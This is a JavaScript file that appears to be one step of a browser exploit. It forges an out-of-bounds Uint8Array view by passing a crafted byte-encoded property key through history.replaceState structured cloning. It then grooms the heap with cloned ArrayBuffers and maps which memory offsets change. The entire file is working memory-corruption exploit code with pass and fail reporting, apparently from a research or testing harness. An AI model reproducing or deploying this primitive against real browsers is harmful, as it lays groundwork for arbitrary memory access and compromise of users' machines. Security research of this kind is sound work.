// Map several cloned fixed buffers near the forged view without releasing them.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | bytes[k + 1] << 8));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var originals = [];
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  for (var i = 0; i < 4; i++) {
    var buffer = new ArrayBuffer(66224);
    new Uint8Array(buffer).fill(0x91 + i);
    originals.push(buffer);
    filler[2 + i] = buffer;
  }
  for (var n = 6; n < 27; n++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + n);
    filler[n] = neighbor;
  }
  for (var j = 27; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  history.replaceState(input, "");
  mark("slot_map_stored");
  phase = "load";
  var output = history.state;
  mark("slot_map_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12 && target.byteLength === 8;
  var firsts = [];
  var counts = [];
  if (valid) {
    phase = "baseline";
    var regionLength = 131072;
    var baseline = new Uint8Array(regionLength);
    for (var k = 0; k < regionLength; k++) baseline[k] = synthetic[k];
    mark("slot_map_baseline");
    for (var m = 0; m < originals.length; m++) {
      phase = "map_" + m;
      var clone = new Uint8Array(output.filler[2 + m]);
      clone.fill(0xc4);
      var first = -1;
      var count = 0;
      for (var q = 0; q < regionLength; q++) {
        if (synthetic[q] !== baseline[q]) {
          if (first < 0) first = q;
          count++;
        }
      }
      clone.fill(0x91 + m);
      firsts.push(first);
      counts.push(count);
    }
    mark("slot_map_done");
  }
  result = { id: "fixed_slot_map", status: valid ? "pass" : "fail", details: {
    view_valid: valid, first_indices: firsts.join(","), changed_prefix_counts: counts.join(","),
    target_first: new Uint8Array(target)[0],
    original_markers: originals.map(function(buffer) { return new Uint8Array(buffer)[0]; }).join(",")
  } };
} catch (error) {
  result = { id: "fixed_slot_map", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
